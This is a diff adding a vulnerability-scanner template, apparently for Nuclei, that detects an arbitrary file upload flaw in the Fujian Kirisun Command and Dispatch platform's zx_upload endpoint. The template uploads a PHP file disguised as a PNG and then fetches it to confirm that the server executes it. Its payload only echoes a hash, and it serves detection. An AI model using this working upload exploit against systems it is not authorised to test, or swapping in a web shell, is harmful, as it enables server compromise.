@@ -1,0 +1,53 @@
+id: poc-kirisun-zx-upload-anyfile-upload
+info:
+  name: Fujian Kirisun ZX Upload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the Fujian Kirisun Command and Dispatch Management Platform's zx_upload module.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload_attempt
+    method: POST
+    path:
+      - "{{BaseURL}}/custom/zx/upload.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+    body: |-
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+      Content-Disposition: form-data; name="ulfile"; filename="{{t1}}.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: file_verification
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
